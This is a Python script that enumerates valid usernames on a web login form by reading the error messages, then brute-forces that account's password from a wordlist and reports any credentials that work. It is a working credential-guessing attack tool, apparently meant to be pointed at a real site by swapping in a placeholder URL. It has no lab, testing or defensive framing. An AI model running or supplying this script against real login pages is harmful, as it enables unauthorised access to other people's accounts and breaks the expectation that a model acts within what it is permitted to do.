import requests

URL_LOGIN = "https://example.com/login" # replace with the real URL
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

def load_file(filename):
    """Reads a file and returns a list of lines"""
    with open(filename, "r") as file:
        return [line.strip() for line in file.readlines()]

USERS = load_file("users.txt")
PASSWORDS = load_file("passwords.txt")

def find_valid_username(session):
    """Find a valid username"""
    for user in USERS:
        data = {"username": user, "password": "123456"}  # dummy password
        response = session.post(URL_LOGIN, data=data, headers=HEADERS)
        if "Invalid username" not in response.text:
            print(f"[🔑] Valid user found: {user}")
            return user
    return None

def find_valid_credentials(session, username):
    """Try multiple passwords for a valid username"""
    for password in PASSWORDS:
        data = {"username": username, "password": password}
        response = session.post(URL_LOGIN, data=data, headers=HEADERS, allow_redirects=False)
        
        # detects if there is a redirection or successful login
        if response.status_code == 302 or "Welcome" in response.text:
            print(f"[✅] Credenciales válidas: {username} / {password}")
            return username, password
        else:
            print(f"[❌] Contraseña incorrecta: {password}")
    return None

def main():
    with requests.Session() as session:
        print("[🔄] Testing usernames...")
        valid_username = find_valid_username(session)
        if not valid_username:
            print("[❌] A valid username was not found.")
            return

        print("[🔄] Probando contraseñas para el usuario encontrado...")
        credentials = find_valid_credentials(session, valid_username)
        if not credentials:
            print("[❌] No valid credentials found.")

if __name__ == "__main__":
    main()